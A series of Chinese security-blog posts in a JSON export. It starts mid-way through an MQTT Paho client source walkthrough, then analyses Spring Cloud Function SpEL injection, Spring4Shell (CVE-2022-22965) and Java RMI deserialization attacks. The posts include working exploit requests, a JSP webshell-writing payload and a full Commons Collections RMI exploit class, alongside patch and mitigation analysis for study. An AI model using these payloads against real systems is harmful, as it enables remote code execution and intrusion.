!this.dataDir.mkdirs()) { throw new MqttPersistenceException(); } else if (!this.dataDir.canWrite()) { throw new MqttPersistenceException(); } else { StringBuffer keyBuffer = new StringBuffer(); int i; char c; for(i = 0; i &lt; clientId.length(); ++i) { c = clientId.charAt(i); if (this.isSafeChar(c)) { keyBuffer.append(c); } } keyBuffer.append(&quot;-&quot;); for(i = 0; i &lt; theConnection.length(); ++i) { c = theConnection.charAt(i); if (this.isSafeChar(c)) { keyBuffer.append(c); } } synchronized(this) { if (this.clientDir == null) { String key = keyBuffer.toString(); this.clientDir = new File(this.dataDir, key); if (!this.clientDir.exists()) { this.clientDir.mkdir(); } } try { this.fileLock = new FileLock(this.clientDir, &quot;.lck&quot;); } catch (Exception var6) { } this.restoreBackups(this.clientDir); } } } 再往下创建org.eclipse.paho.client.mqttv3.internal.ClientComms对象 public ClientComms(IMqttAsyncClient client, MqttClientPersistence persistence, MqttPingSender pingSender, ExecutorService executorService) throws MqttException { this.conState = 3; this.client = client; this.persistence = persistence; this.pingSender = pingSender; this.pingSender.init(this); this.executorService = executorService; this.tokenStore = new CommsTokenStore(this.getClient().getClientId()); this.callback = new CommsCallback(this); this.clientState = new ClientState(persistence, this.tokenStore, this.callback, this, pingSender); this.callback.setClientState(this.clientState); log.setResourceName(this.getClient().getClientId()); } 这里讲一下pingSender，这是在创建MqttAsyncClient对象时创建的 用于在每个保持活动间隔向 MQTT 代理发送 ping 数据包的对象，也就是心跳时间 public void init(ClientComms comms) { if (comms == null) { throw new IllegalArgumentException(&quot;ClientComms cannot be null.&quot;); } else { this.comms = comms; } } ini初始方法，传入了ClientComms，也就是当前客户端的内部状态。 然后分别创建了CommsTokenStore，CommsCallback，ClientState对象，这里大概讲一下三个类的作用 先讲CommsTokenStore，CommsTokenStore提供提供基于“token”的系统，用于跨多个线程存储和跟踪操作（多线程），所关联的Token将会使用saveToken保存，任何一个感兴趣的追踪状态通过getTkoen在wait方法或者使用监听进行回调。 而CommsCallback是Receiver 和外部 API 之间的桥梁。 用来桥接Receiver和外部api进行回调，它将转换MQTT message objects进行最终回调。 最重要的就是ClientState类，它是客户端的核心，它保存待处理和正在进行的消息的状态信息。已接受传递的消息在传递时会在多个对象之间移动。 当客户端不运行时，消息存储在实现 MqttClientPersistent 接口的持久存储中。默认值为 MqttDefaultFilePersistencew，它在故障和系统重新启动时安全地存储消息。如果没有指定持久性，则回退到 MemoryPersistence，它将在实例化 Mqtt 客户端时保存和维护消息。 （CleanSession的实现） 当客户端或特别是 ClientState 被实例化时 如果 QoS 2 PUBLISH 或 PUBREL 消息从持久存储将会读取到 outboundqos2 hashtable 如果 QoS 1 PUBLISH 消息从持久存储将会读取到 outboundqos1 hashtable 在连接时，根据 messageid 将outbound hashtables中的messages顺序发送到 pendingMessages 或 pendingFlows vector。 初始消息发布进入endingmessages buffer（等待数据队列） PUBREL 进入pendingflows buffer （飞行窗口队列） 发送线程同时从pendingflows 和pendingmessages 缓冲区读取消息。消息从pendingbuffer中删除，但仍保留在outbound hashtable中。 接收线程 如果是 QoS 1 消息，则移除持久化已经从 outboundqos1 中删除 消息 如果 是QoS 2 PUBREC send PUBREL 消息，使用 PUBREL 更新 outboundqos2 条目并持久化。 如果 是QoS 2 PUBCOMP 消息，将会移除持久化和outboundqos2对应消息 流程分析 学习了这些概念后，后续可以再通过debug来从流程的角度进行学习 由于是客户端，主要从五个点来进行源码学习 连接broker 创建主题 发布主题内容 订阅主题 接收主题内容 参考 mqttv3文档：https://www.eclipse.org/paho/files/javadoc/index.html mqttv3项目：https://github.com/eclipse/paho.mqtt.java ","link":"https://liangyueliangyue.github.io/post/mqtt-xie-yi-che-lian-wang-ying-yong-andyuan-ma-fen-xi-yi/"},{"title":"Spring Cloud Function Spel表达式注入","content":"Spring Cloud Function Spel表达式注入 漏洞概述 Spring Cloud Function 是基于Spring Boot 的函数计算框架（FaaS），支持基于SpEL的函数式动态路由。在特定配置下，3 &lt;= 版本 &lt;= 3.2.2（ commit dc5128b 之前）存在SpEL表达式执行导致的RCE。 环境搭建 在IDEA中选择新建项目，然后选择Spring Initializr，输入随机项目名称，然后选择java版本和jdk版本后点击下一步。 选择Spring Web Spring Cloud function 最新版本3.2.2也是存在漏洞的，若在官方出新版本后想要复现此漏洞，那么需要修改pom中spring-cloud-function-web的版本为3.2.2，如下图所示： 确认项目中的spring-cloud-function-web是存在漏洞版本后，就可以直接启动项目了，无需进行任何修改。 漏洞复现 弹计算器payload POST /functionRouter HTTP/1.1 Host:127.0.0.1:8080 spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;) Content-Type:application/x-www-form-urlencoded Content-Length: 3 xxx 看一眼POC就知道其实就是简单的在请求的headers头上添加一个spring.cloud.function.routing-expression参数 SpringCloud Function会直接将其参数内容直接带入到SPEL中查询，造成SPEL漏洞注入。 漏洞分析 漏洞是出在SpringCloud Function的RoutingFunction功能上，其功能的目的本身就是为了微服务应运而生的，可以直接通过HTTP请求与单个的函数进行交互，同时为spring.cloud.function.definition参数提供您要调用的函数的名称。 为了更好的分析，可以先在springcloudfunctionspel\\src\\main\\java\\com\\example\\springcloudfunctionspel\\SpringcloudfunctionspelApplication.java中写测试Demo 然后再进行访问，请求中写出存在的函数就能够调用 POST /functionRouter HTTP/1.1 Host: localhost:8080 spring.cloud.function.definition: uppercase Content-Type: text/plain Content-Length: 3 abc 成功得到abc的大写结果ABC 漏洞存在于header头的spring.cloud.function.routing-expression参数 ，和definition相同，他也是官方提供的功能。 在org.springframework.cloud.function.web.util.FunctionWebRequestProcessingHelper#processRequest方法下断点 程序会判断当前请求是否为RoutingFunction 并将我们提交的请求头和请求体内容编译成Message并且传入FunctionInvocationWrapper的apply方法中 跟进RoutingFunction的apply方法 最后进入到org.springframework.cloud.function.context.config.RoutingFunction#route方法中 然后在这里判断了请求headers头中有没有spring.cloud.function.routing-expression参数（这里可以清晰的看到spring.cloud.function.definition也是在这里做判断的） 并将结果带入到this.functionFromExpression()方法中 在这里最后SpelExpressionParser解析了Spel表达式，调用了expression.getValue导致Spel表达式注入 而他的EvaluationContext又采取了默认的StandardEvaluationContext，在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下SpEL表达式是可以操作类及其方法的，可以通过类类型表达式T(Type)或者直接new来调用任意对象的任意方法，成功造成任意命令执行。 补丁分析 https://github.com/spring-cloud/spring-cloud-function/commit/dc5128b80c6c04232a081458f637c81a64fa9b52 由于又是Spel注入问题，很容易定位到Context 新增了headerEvalContext常量为SimpleEvaluationContext，显然是为了替换evalContext常量的StandardEvaluationContext而创建的 增加了判断来源是否是header，如果是header就使用属于SimpleEvaluationContext的headerEvalContext，不是header才会使用属于StandardEvaluationContext的evalContext。 从而解决了发送恶意请求就能够RCE的问题。 后记 整个流程也是很清晰，就是官方提供的类似spring.cloud.function.definition的功能，spring.cloud.function.routing-expression有解析Spel表达式的能力，而且使用的是默认的StandardEvaluationContext。最终Spel表达式注入造成了命令执行。 和Spring Cloud Gateway rce其实是相似的，都是官方提供的功能有Spel表达式解析能力，但都没有对指定EvaluationContext，采用默认的StandardEvaluationContext从而导致了命令执行。 不过这个影响范围在国内是更小的，后续的回显链挖掘也没有进行（也是因为影响范围吧） 参考 https://www.cnblogs.com/wh4am1/p/16062306.html ","link":"https://liangyueliangyue.github.io/post/spring-cloud-function-spel-biao-da-shi-zhu-ru/"},{"title":"Spring Framework RCE(CVE-2022-22965)","content":"Spring Framework RCE(CVE-2022-22965) 利用环境 war包 https://github.com/fengguangbin/spring-rce-war docker环境 https://github.com/lunasec-io/Spring4Shell-POC https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22965 在线环境 http://vulfocus.io 漏洞原理 简答来说就是参数绑定造成的变量覆盖漏洞，漏洞点spring-beans包中。 Spring MVC 框架的参数绑定功能提供了将请求中的参数绑定控制器方法中参数对象的成员变量，通过 ClassLoader构造恶意请求获取AccessLogValue 对象并注入恶意字段值，来更改 Tomcat 服务器的日志记录属性触发 pipeline 机制写入任意路径下的文件。 CVE-2010-1622 这个漏洞其实就是CVE-2010-1622的绕过，CVE-2010-1622可以参考Ruilin大佬写的 http://rui0.cn/archives/1158 简单来说就是可以获取到Classloader，而在Tomcat中，一些和Tomcat的全局配置相关的属性都保存在org.apache.catalina.loader.ParallelWebappClassLoader这个Tomcat专属的ClassLoader当中。 那么，我们就可以通过person.getClass().getClassLoader().getXXX()修改ParallelWebappClassLoader中的一些属性来修改Tomcat的配置项。也就是后面的利用：tomcat AccessLogValue，这里先不讲。 Spring对这个漏洞的修复方式，就是通过黑名单的方式，增加了if语句来检查用户输入。 这个if语句的意思就是，当发现当前的对象是一个Class，然后又在获取其classLoader属性，则直接跳过。这样就断了之间的class.classLoader这条链。 至于为什么现在又绕过了，其实看payload就能看出端倪 class.module.classLoader.resources.context.parent.pipeline.first.pattern class.module.classLoader 这个module是什么，其实就是jdk9开始引入的模块系统（这也说明了为什么这个漏洞的影响范围是jdk9+） https://juejin.cn/post/6844903501311524871 module存在getClassLoader()方法,正好用来写一条新的链 之前的链 class.classLoader.resources.context.parent.pipeline.first.pattern 现在 class.module.classLoader.resources.context.parent.pipeline.first.pattern 其实就只是module链点的增加导致了了官方的黑名单防御被绕过 tomcat AccessLogValue 这个利用手法在strust2上的ClassLoader 漏洞 (CVE-2014-0094) 上早就出现过 https://www.exploit-db.com/exploits/33142 利用了 Tomcat 使用的ClassLoader 该漏洞通过修改 Tomcat 的日志设置（通过AccessLogValve)来写入恶意文件 https://tomcat.apache.org/tomcat-8.0-doc/config/valve.html 主要利用字段 directory 将放置此 Valve 创建的日志文件的目录的绝对或相对路径名。如果指定了相对路径，则将其解释为相对于 $CATALINA_BASE。如果未指定目录属性，则默认值为“logs”（相对于 $CATALINA_BASE）。 prefix 添加到每个日志文件名称开头的前缀。如果未指定，默认值为“access_log”。 suffix 添加到每个日志文件名称末尾的后缀。如果未指定，则默认值为“”（长度为零的字符串），表示不会添加后缀。 fileDateFormat 允许在访问日志文件名中自定义时间戳。每当格式化的时间戳更改时，文件就会旋转。默认值为.yyyy-MM-dd。如果您希望每小时轮换一次，则将此值设置为.yyyy-MM-dd.HH。日期格式将始终使用 locale 进行本地化en_US。 pattern 一种格式布局，用于标识要记录的请求和响应中的各种信息字段，或者选择标准格式的 common单词combined。有关配置此属性的更多信息，请参见下文。 POC中class.classLoader.resources.context.parent.pipeline.first这个属性实际是org.apache.catalina.valves.AccessLogValve，在conf/server.xml里面有一段相关的配置： 为何修改了dataformat会触发切换日志呢？注意下面一个属性，默认是true .class.classLoader.resources.context.parent.pipeline.first.rotatable 每次Log时，都会调用rotate: publicvoid log(CharArrayWriter message) {rotate();… 而rotate是检查当前的systime 经过format后，与当前的tsDate是否相同。如果日期不同了，自然需要切换日志文件了： public void rotate(){ if (this.rotatable){ long systime =System.currentTimeMillis(); if (systime - this.rotationLastChecked&gt; 1000L) synchronized (this){ if (systime -this.rotationLastChecked &gt; 1000L){ this.rotationLastChecked = systime; String tsDate =this.fileDateFormatter.format(new Date(systime)); if (!this.dateStamp.equals(tsDate)){ close(true); this.dateStamp = tsDate; open(); } } } } } 所以修改了dateFormat，就触发了日志切换。这是由tomcat代码决定的。在linux与windows下证实该问题均存在。 漏洞复现 payload POST /index HTTP/1.1 Host: 192.168.137.222:8077 Content-Type: application/x-www-form-urlencoded Accept: */* Cache-Control: no-cache Accept-Encoding: gzip, deflate Connection: close Content-Length: 494 suffix: %&gt; prefix: &lt;%Runtime class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di.getRuntime%28%29.exec%28request.getParameger%28%22cmd%22%29%29%3B%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=C%3a%2Ftmp&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=6right&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= %不能够出现，需要使用占位符替换，占位符是什么？ pattern参数自定义请求头 AccessLogValve还支持写入信息传入或传出标头、cookie、会话或请求属性和特殊时间戳格式。它以 Apache HTTP Server日志配置语法为模型。xxx它们中的每一个都可以使用不同的键 多次使用： %{xxx}i 请求headers的信息 %{xxx}o 响应headers的信息 %{xxx}c 请求cookie的信息 %{xxx}r xxx是ServletRequest的一个属性 %{xxx}s xxx是HttpSession的一个属性 所以我们可以通过日志的配置语法来进行占位符写入% 利用脚本编写 问题一 日志的机制，初次写入之后不能改变写入文件名称以及内容路径，且每次访问都会追加一次内容 解决 写入webshell加上&lt;!--注释后面的内容 执行内容为写入内容到其他文件中 根本解决：修改dataformat可以触发切换日志，是tomcat日志决定的 问题二 写入内容不能存在%，会变成三个问号 解决 使用占位符解决 持久化利用 写入内存马？（没去实现） 脚本实现 漏洞探测 写入冰蝎马 自定义写入文件名称及路径 不会追加写入到同一文件中 脚本github地址，记得给个☆ https://github.com/liangyueliangyue/spring-core-rce 官方修复 https://github.com/spring-projects/spring-framework/commit/afbff391d8299034cd98af968981504b6ca7b38c 可以看到，这次官方不在采用黑名单的形式去防御（不然继续过滤module，以后更新还有modulf ， modulg等等，就天天打补丁了），而是采用白名单，当beanClass是class.Class时，只允许添加name属性。并且如果属性是ClassLoader 和 ProtectionDomain，会被忽略。 waf防御 对“class.”“Class.”“.class.”“.Class.”等字符串，部署规则进行过滤 临时修复 需同时按以下两个步骤进行漏洞的临时修复: 在应用中全局搜索@InitBinder注解，看看方法体内是否调用dataBinder.setDisallowedFields方法，如果发现此代码片段的引入，则在原来的黑名单中，添加{&quot;class.&quot;,&quot;Class. &quot;,&quot;. class.&quot;, &quot;.Class.&quot;}。 (注:如果此代码片段使用较多,需要每个地方都追加) 在应用系统的项目包下新建以下全局类，并保证这个类被Spring 加载到(推荐在Controller 所在的包中添加).完成类添加后，需对项目进行重新编译打包和功能验证测试。并重新发布项目。 import org.springframework.core.annotation.Order; import org.springframework.web.bind.WebDataBinder; import org.springframework.web.bind.annotation.ControllerAdvice; import org.springframework.web.bind.annotation.InitBinder; @ControllerAdvice @Order(10000) public class GlobalControllerAdvice{ @InitBinder public void setAllowedFields(webdataBinder dataBinder){ String[]abd=new string[]{&quot;class.*&quot;,&quot;Class.*&quot;,&quot;*.class.*&quot;,&quot;*.Class.*&quot;}; dataBinder.setDisallowedFields(abd); } } 后记 这次的spring漏洞传的沸沸扬扬，最后的结果却是雷声大雨点小。当前确定的spring 框架漏洞前置条件比较苛刻，影响范围并不大，并不能做到比肩log4j 目前来看后续的利用只能围绕classLoader去进行深入挖掘。 ","link":"https://liangyueliangyue.github.io/post/spring-framework-rcecve-2022-22965/"},{"title":"JavaSec-RMI","content":"RMI RMI(Remote Method Invocation)即Java远程方法调用，RMI用于构建分布式应用程序，RMI实现了Java程序之间跨JVM的远程通信。让某个Java虚拟机上的对象调⽤另⼀个Java虚拟机中对象上的⽅法。 RMI结构 RMI底层通讯采用了Stub(运行在客户端)和Skeleton(运行在服务端)机制，RMI调用远程方法的大致如下： RMI客户端在调用远程方法时会先创建Stub(sun.rmi.registry.RegistryImpl_Stub)。 Stub会将Remote对象传递给远程引用层(java.rmi.server.RemoteRef)并创建java.rmi.server.RemoteCall(远程调用)对象。 RemoteCall序列化RMI服务名称、Remote对象。 RMI客户端的远程引用层传输RemoteCall序列化后的请求信息通过Socket连接的方式传输到RMI服务端的远程引用层。 RMI服务端的远程引用层(sun.rmi.server.UnicastServerRef)收到请求会请求传递给Skeleton(sun.rmi.registry.RegistryImpl_Skel#dispatch)。 Skeleton调用RemoteCall反序列化RMI客户端传过来的序列化。 Skeleton处理客户端请求：bind、list、lookup、rebind、unbind，如果是lookup则查找RMI服务名绑定的接口对象，序列化该对象并通过RemoteCall传输到客户端。 RMI客户端反序列化服务端结果，获取远程对象的引用。 RMI客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。 RMI客户端反序列化RMI远程方法调用结果。 RMI远程方法调用Demo 第一步我们需要先启动RMI服务端，并注册服务。 ⼀个RMI Server分为三部分： ⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数 ⼀个实现了此接⼝的类 ⼀个主类，⽤来创建Registry，并将上⾯的类实例化后绑定到⼀个地址。这就是我们所谓的Server 了。 先实现一个继承了 java.rmi.Remote 的接⼝,定要test函数 package com.sec.rmi; import java.rmi.Remote; import java.rmi.RemoteException; /** * RMI测试接口 */ public interface RMIInterfaceDemo extends Remote { /** * RMI测试方法 * * @return 返回测试字符串 */ String test() throws RemoteException; } 在实现⼀个实现了此接⼝的类 ,并重写了test函数 package com.sec.rmi; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class RMIImplDemo extends UnicastRemoteObject implements RMIInterfaceDemo { private static final long serialVersionUID = 1L; protected RMIImplDemo() throws RemoteException { super(); } /** * RMI测试方法 * * @return 返回测试字符串 */ @Override public String test() throws RemoteException { return &quot;Hello 6right~&quot;; } } 最后是RMI服务端注册服务代码： Java RMI 设计了一个 Registry 的思想，很好理解，我们可以使用注册表来查找一个远端对象的引用，更通俗的来讲，这个就是一个 RMI 电话本，我们想在某个人那里获取信息时（Remote Method Invocation），我们在电话本上（Registry）通过这个人的名称 （Name）来找到这个人的电话号码（Reference），并通过这个号码找到这个人（Remote Object） package com.sec.rmi; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class RMIServerDemo { // RMI服务器IP地址 public static final String RMI_HOST = &quot;127.0.0.1&quot;; // RMI服务端口 public static final int RMI_PORT = 9527; public static final String RMI_NAME = &quot;rmi://&quot; + RMI_HOST + &quot;:&quot; + RMI_PORT + &quot;/test&quot;; public static void main(String[] args) throws Exception { //新建一个RMI Registry的时候，直接绑定RMIImplDemo对象在上面 LocateRegistry.createRegistry(RMI_PORT); //Naming.bind 的第一个参数是一个URL，形如： rmi://host:port/name 。其中，host和port就是RMI Registry的地址和端口，name是远程对象的名字。如果RMI Registry在本地运行，那么host和port是可以省略的，此时host默认是 localhost ，port默认 是 1099 ： Naming.bind(RMI_NAME, new RMIImplDemo()); System.out.println(&quot;RMI服务启动成功,服务地址:&quot; + RMI_NAME); } } 程序运行结果： RMI服务启动成功,服务地址:rmi://127.0.0.1:9527/test Naming.bind(RMI_NAME, new RMITestImpl())绑定的是服务端的一个类实例，RMI客户端需要有这个实例的接口代码(RMITestInterface.java)，RMI客户端调用服务器端的RMI服务时会返回这个服务所绑定的对象引用，RMI客户端可以通过该引用对象调用远程的服务实现类的方法并获取方法执行结果。 RMI客户端示例代码： package com.sec.rmi; import java.rmi.Naming; import static com.sec.rmi.RMIServerDemo.RMI_NAME; public class RMIClientDemo { public static void main(String[] args) { try { // 查找远程RMI服务 RMIInterfaceDemo rt = (RMIInterfaceDemo) Naming.lookup(RMI_NAME); // 调用远程接口RMITestInterface类的test方法 String result = rt.test(); // 输出RMI方法调用结果 System.out.println(result); } catch (Exception e) { e.printStackTrace(); } } } 客户端就简单多了，使⽤ Naming.lookup 在Registry中寻找到名字是Hello的对象，后⾯的使⽤就和在 本地使⽤⼀样了。 虽说执⾏远程⽅法的时候代码是在远程服务器上执⾏的，但实际上我们还是需要知道有哪些⽅法，这时 候接⼝的重要性就体现了，这也是为什么我们前⾯要继承 Remote 并将我们需要调⽤的⽅法写在接⼝ RMIInterfaceDemo⾥，因为客户端也需要⽤到这个接⼝。 程序运行结果： 上面的Demo是在本地下实现的，现在在两台主机上进行C/S的流程 服务端还是刚刚的本地服务端，客户端改部署在kali上 kali-ip：192.168.159.132 本机ip：192.168.159.1 kali上RMIClientDemo.java package com.sec.rmi; import java.rmi.Naming; public class RMIClientDemo { public static final String RMI_HOST = &quot;192.168.159.1&quot;; public static final int RMI_PORT = 9527; public static final String RMI_NAME = &quot;rmi://&quot; + RMI_HOST + &quot;:&quot; + RMI_PORT + &quot;/test&quot;; public static void main(String[] args) { try { // 查找远程RMI服务 RMIInterfaceDemo rt = (RMIInterfaceDemo) Naming.lookup(RMI_NAME); // 调用远程接口RMITestInterface类的test方法 String result = rt.test(); // 输出RMI方法调用结果 System.out.println(result); } catch (Exception e) { e.printStackTrace(); } } } 还需要实现接口RMIInterfaceDemo.java package com.sec.rmi; import java.rmi.Remote; import java.rmi.RemoteException; /** * RMI测试接口 */ public interface RMIInterfaceDemo extends Remote { /** * RMI测试方法 * * @return 返回测试字符串 */ String test() throws RemoteException; } tips： 服务端的包名就是最开始的package com.sec.rmi;，客户端包名也要一样不然会报错 RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name 到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程⽅法实际上在RMI Server上调⽤。 RMI客户端攻击服务端 RMI攻击围绕着三个主体 Server端 Client端 Registry端 最常见的就是在Client端攻击Server端，所以接下来的分析都是如此 RMI反序列化漏洞 RMI通信中所有的对象都是通过Java序列化传输的，只要有Java对象反序列化操作就有可能有漏洞。 既然RMI使用了反序列化机制来传输Remote对象，那么可以通过构建一个恶意的Remote对象，这个对象经过序列化后传输到服务器端，服务器端在反序列化时候就会触发反序列化漏洞。 首先我们依旧使用上述com.sec.rmi.RMIServerDemo的代码，创建一个RMI服务，然后我们来构建一个恶意的Remote对象并通过bind请求发送给服务端。 RMI客户端反序列化攻击示例代码： tips: 这里使用的是CC链，jdk版本下调至1.7才可以复现RCE package com.sec.rmi; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import javax.net.ssl.SSLContext; import javax.net.ssl.SSLSocketFactory; import javax.net.ssl.TrustManager; import javax.net.ssl.X509TrustManager; import java.io.IOException; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.net.Socket; import java.rmi.ConnectIOException; import java.rmi.Remote; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.RMIClientSocketFactory; import java.security.cert.X509Certificate; import java.util.HashMap; import java.util.Map; import static com.sec.rmi.RMIServerDemo.RMI_HOST; import static com.sec.rmi.RMIServerDemo.RMI_PORT; /** * RMI反序列化漏洞利用，修改自ysoserial的RMIRegistryExploit：https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/RMIRegistryExploit.java * * @author yz */ public class RMIExploit { // 定义AnnotationInvocationHandler类常量 public static final String ANN_INV_HANDLER_CLASS = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;; /** * 信任SSL证书 */ private static class TrustAllSSL implements X509TrustManager { private static final X509Certificate[] ANY_CA = {}; public X509Certificate[] getAcceptedIssuers() { return ANY_CA; } public void checkServerTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ } public void checkClientTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ } } /** * 创建支持SSL的RMI客户端 */ private static class RMISSLClientSocketFactory implements RMIClientSocketFactory { public Socket createSocket(String host, int port) throws IOException { try { // 获取SSLContext对象 SSLContext ctx = SSLContext.getInstance(&quot;TLS&quot;); // 默认信任服务器端SSL ctx.init(null, new TrustManager[]{new TrustAllSSL()}, null); // 获取SSL Socket连接工厂 SSLSocketFactory factory = ctx.getSocketFactory(); // 创建SSL连接 return factory.createSocket(host, port); } catch (Exception e) { throw new IOException(e); } } } /** * 使用动态代理生成基于InvokerTransformer/LazyMap的Payload * * @param command 定义需要执行的CMD * @return Payload * @throws Exception 生成Payload异常 */ private static InvocationHandler genPayload(String command) throws Exception { // 创建Runtime.getRuntime.exec(cmd)调用链 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{ String.class, Class[].class}, new Object[]{ &quot;getRuntime&quot;, new Class[0]} ), new InvokerTransformer(&quot;invoke&quot;, new Class[]{ Object.class, Object[].class}, new Object[]{ null, new Object[0]} ), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{command}) }; // 创建ChainedTransformer调用链对象 Transformer transformerChain = new ChainedTransformer(transformers); // 使用LazyMap创建一个含有恶意调用链的Transformer类的Map对象 final Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain); // 获取AnnotationInvocationHandler类对象 Class clazz = Class.forName(ANN_INV_HANDLER_CLASS); // 获取AnnotationInvocationHandler类的构造方法 Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); // 设置构造方法的访问权限 constructor.setAccessible(true); // 实例化AnnotationInvocationHandler， // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, lazyMap); InvocationHandler annHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap); // 使用动态代理创建出Map类型的Payload final Map mapProxy2 = (Map) Proxy.newProxyInstance( ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, annHandler ); // 实例化AnnotationInvocationHandler， // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, mapProxy2); return (InvocationHandler) constructor.newInstance(Override.class, mapProxy2); } /** * 执行Payload * * @param registry RMI Registry * @param command 需要执行的命令 * @throws Exception Payload执行异常 */ public static void exploit(final Registry registry, final String command) throws Exception { // 生成Payload动态代理对象 Object payload = genPayload(command); String name = &quot;test&quot; + System.nanoTime(); // 创建一个含有Payload的恶意map Map&lt;String, Object&gt; map = new HashMap(); map.put(name, payload); // 获取AnnotationInvocationHandler类对象 Class clazz = Class.forName(ANN_INV_HANDLER_CLASS); // 获取AnnotationInvocationHandler类的构造方法 Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); // 设置构造方法的访问权限 constructor.setAccessible(true); // 实例化AnnotationInvocationHandler， // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, map); InvocationHandler annHandler = (InvocationHandler) constructor.newInstance(Override.class, map); // 使用动态代理创建出Remote类型的Payload Remote remote = (Remote) Proxy.newProxyInstance( ClassLoader.getSystemClassLoader(), new Class[]{Remote.class}, annHandler ); try { // 发送Payload registry.bind(name, remote); } catch (Throwable e) { e.printStackTrace(); } } public static void main(String[] args) throws Exception { if (args.length == 0) { // 如果不指定连接参数默认连接本地RMI服务 args = new String[]{RMI_HOST, String.valueOf(RMI_PORT), &quot;calc&quot;}; } // 远程RMI服务IP final String host = args[0]; // 远程RMI服务端口 final int port = Integer.parseInt(args[1]); // 需要执行的系统命令 final String command = args[2]; // 获取远程Registry对象的引用 Registry registry = LocateRegistry.getRegistry(host, port); try { // 获取RMI服务注册列表(主要是为了测试RMI连接是否正常) String[] regs = registry.list(); for (String reg : regs) { System.out.println(&quot;RMI:&quot; + reg); } } catch (ConnectIOException ex) { // 如果连接异常尝试使用SSL建立SSL连接,忽略证书信任错误，默认信任SSL证书 registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory()); } // 执行payload exploit(registry, command); } } 程序执行后将会在RMI服务端弹出计算器，RMIExploit程序执行的流程大致如下： 使用LocateRegistry.getRegistry(host, port)创建一个RemoteStub对象。 构建一个适用于Apache Commons Collections的恶意反序列化对象(使用的是LazyMap+AnnotationInvocationHandler组合方式)。 使用RemoteStub调用RMI服务端的bind指令，并传入一个使用动态代理创建出来的Remote类型的恶意AnnotationInvocationHandler对象到RMI服务端。 RMI服务端接受到bind请求后会反序列化我们构建的恶意Remote对象从而触发Commons Collections漏洞的RCE。 codebase远程代码执行 Codebase codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类,而CLASSPATH是“本地codebase”，它是磁盘上加载本地类的位置。 codebase通常是远程URL，比如http、ftp等。 例如指定 codebase=http://example.com/ ，然后加载 com.sec.Codebase.Example 类，则 Java虚拟机会下载这个文件 http://example.com/com.sec.Codebase.Example，并作为 Example类的字节码。 RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在 本地没有找到这个类，就会去远程加载codebase中的类。 例如RMIClientDemo.java 编译之后会生成RMIClientDemo.class 和 RMIClientDemo$Right6.class，我们的服务端会访问这两个文件 在RMI中，我们是可以将codebase随着序列化数据一起传输的，服务器在接收到这个数据后在 CLASSPATH没有找到，就会去指定的codebase寻找类，往RMIClient.java中添加恶意命令执行的代码，由于codebase被控制导致任意命令执行漏洞。 只有满足如下条件的RMI服务器才能被攻击： 需要SecurityManager 因为我们通过网络加载外部类并执行方法，所以我们必须要有一个安全管理器来进行管理，如果没有设置安全管理，则 RMI 不会动态加载任何类 Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false 官方在Java 7u21、6u45的时候将 java.rmi.server.useCodebaseOnly 的默认值由 false 改为了 true 。 在 java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好的 codebase ，不再支持从RMI请求中获取。 复现Demo 我们来编写一个简单的RMIServer用于复现这个漏洞。 注意jdk环境要低于7u21、6u45，这里我使用JDK 1.7.0_17 客户端 kali：192.168.159.132 RMIClientDemo.java package com.sec.rmi; import java.io.Serializable; import java.rmi.Naming; import java.util.ArrayList; import java.util.List; public class RMIClientDemo implements Serializable { public static final String RMI_HOST = &quot;192.168.159.1&quot;; public static final int RMI_PORT = 9527; public static final String RMI_NAME = &quot;rmi://&quot; + RMI_HOST + &quot;:&quot; + RMI_PORT + &quot;/test&quot;; public class Right6 extends ArrayList&lt;Integer&gt; {} public void lookup() throws Exception { List&lt;Integer&gt; li = new Right6(); RMIInterfaceDemo rt = (RMIInterfaceDemo) 